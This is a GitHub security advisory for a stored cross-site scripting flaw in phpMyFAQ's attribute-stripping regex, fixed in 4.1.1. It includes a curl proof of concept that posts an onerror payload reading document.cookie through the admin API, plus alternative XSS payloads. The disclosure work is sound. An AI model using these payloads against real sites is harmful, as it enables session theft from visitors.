# [M] phpMyFAQ: Stored XSS via Regex Bypass in Filter::removeAttributes()

## Summary
Severity: Medium
Advisory: GHSA-cv2g-8cj8-vgc7
CVE: CVE-2026-34729
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-cv2g-8cj8-vgc7
Type: github-advisory

## Affected
- Packagist: `phpmyfaq/phpmyfaq` — affected >=0 <4.1.1

## Details
### Summary
The sanitization pipeline for FAQ content is:
1. `Filter::filterVar($input, FILTER_SANITIZE_SPECIAL_CHARS)` — encodes `<`, `>`, `"`, `'`, `&` to HTML entities
2. `html_entity_decode($input, ENT_QUOTES | ENT_HTML5)` — decodes entities back to characters
3. `Filter::removeAttributes($input)` — removes dangerous HTML attributes

The `removeAttributes()` regex at line 174 only matches attributes with double-quoted values:
```php
preg_match_all(pattern: '/[a-z]+=".+"/iU', subject: $html, matches: $attributes);
```

This regex does NOT match:
- Attributes with single quotes: `onerror='alert(1)'`
- Attributes without quotes: `onerror=alert(1)`

An attacker can bypass sanitization by submitting FAQ content with unquoted or single-quoted event handler attributes.

### Details

**Affected File:** `phpmyfaq/src/phpMyFAQ/Filter.php`, line 174

**Sanitization flow for FAQ question field:**

`FaqController::create()` lines 110, 145-149:
```php
$question = Filter::filterVar($data->question, FILTER_SANITIZE_SPECIAL_CHARS);
// ...
->setQuestion(Filter::removeAttributes(html_entity_decode(
    (string) $question,
    ENT_QUOTES | ENT_HTML5,
    encoding: 'UTF-8',
)))
```

**Template rendering:** `faq.twig` line 36:
```twig
<h2 class="mb-4 border-bottom">{{ question | raw }}</h2>
```

**How the bypass works:**

1. Attacker submits: `<img src=x onerror=alert(1)>`
2. After `FILTER_SANITIZE_SPECIAL_CHARS`: `&lt;img src=x onerror=alert(1)&gt;`
3. After `html_entity_decode()`: `<img src=x onerror=alert(1)>`
4. `preg_match_all('/[a-z]+=".+"/iU', ...)` runs:
   - The regex requires `="..."` (double quotes)
   - `onerror=alert(1)` has NO quotes → NOT matched
   - `src=x` has NO quotes → NOT matched
   - No attributes are found for removal
5. Output: `<img src=x onerror=alert(1)>` (XSS payload intact)
6. Template renders with `|raw`: JavaScript executes in browser

**Why double-quoted attributes are (partially) protected:**

For `<img src="x" onerror="alert(1)">`:
- The regex matches both `src="x"` and `onerror="alert(1)"`
- `src` is in `$keep` → preserved
- `onerror` is NOT in `$keep` → removed via `str_replace()`
- Output: `<img src="x">` (safe)

But this protection breaks with single quotes or no quotes.

### PoC

**Step 1: Create FAQ with XSS payload (requires authenticated admin):**
```bash
curl -X POST 'https://target.example.com/admin/api/faq/create' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: PHPSESSID=admin_session' \
  -d '{
    "data": {
      "pmf-csrf-token": "valid_csrf_token",
      "question": "<img src=x onerror=alert(document.cookie)>",
      "answer": "Test answer",
      "lang": "en",
      "categories[]": 1,
      "active": "yes",
      "tags": "test",
      "keywords": "test",
      "author": "test",
      "email": "test@test.com"
    }
  }'
```

**Step 2: XSS triggers on public FAQ page**

Any user (including unauthenticated visitors) viewing the FAQ page triggers the XSS:
```
https://target.example.com/content/{categoryId}/{faqId}/{lang}/{slug}.html
```

The FAQ title is rendered with `|raw` in `faq.twig` line 36 without HtmlSanitizer processing (the `processQuestion()` method in `FaqDisplayService` only applies search highlighting, not `cleanUpContent()`).

**Alternative payloads:**
```html
<img/src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
```

### Impact

- **Public XSS:** The XSS executes for ALL users viewing the FAQ page, not just admins.
- **Session hijacking:** Steal session cookies of all users viewing the FAQ.
- **Phishing:** Display fake login forms to steal credentials.
- **Worm propagation:** Self-replicating XSS that creates new FAQs with the same payload.
- **Malware distribution:** Redirect users to malicious sites.

**Note:** While planting the payload requires admin access, the XSS executes for all visitors (public-facing). This is not self-XSS.

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-cv2g-8cj8-vgc7
- https://nvd.nist.gov/vuln/detail/CVE-2026-34729
- https://github.com/thorsten/phpMyFAQ
- https://github.com/thorsten/phpMyFAQ/releases/tag/4.1.1
